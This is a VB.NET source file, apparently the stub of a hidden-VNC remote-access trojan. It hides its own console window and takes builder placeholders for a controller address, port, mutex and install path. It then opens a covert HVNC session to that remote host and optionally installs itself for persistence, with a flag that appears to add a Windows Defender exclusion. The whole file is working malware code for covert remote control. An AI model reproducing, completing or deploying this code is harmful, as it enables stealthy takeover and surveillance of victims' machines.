Imports System
Imports System.Runtime.InteropServices

Namespace Stub
	Friend Class Program
		<DllImport("kernel32.dll")> _
		Public Shared Function GetConsoleWindow() As IntPtr
		End Function

		<DllImport("user32.dll")> _
		Public Shared Function ShowWindow(ByVal hWnd As IntPtr, ByVal nCmdShow As Integer) As Boolean
		End Function

		Public Const SW_HIDE As Integer = 0

		Public Shared Sub Main(ByVal args() As String)

			Dim handle = GetConsoleWindow()

			' Hide Console
			ShowWindow(handle, SW_HIDE)

			Dim IP_DNS As String = "#IPDNS#"
			Dim PORT As String = "#PORT#"
			Dim ID As String = "#ID#"
			Dim MUTEX As String = "#MUTEX#"

			Dim STARTUP As String = "#STARTUP#"
			Dim PATH As String = "#PATH#"
			Dim FOLDER As String = "#FOLDER#"
			Dim FILENAME As String = "#FILENAME#"

			Dim WDEX As String = "#WDEX#"

			HVNC.StartHVNC(IP_DNS & " " & PORT, ID, MUTEX)

			If STARTUP = "True" Then
				Installer.Run(PATH, FOLDER, FILENAME, WDEX)
			End If

		End Sub

	End Class

End Namespace

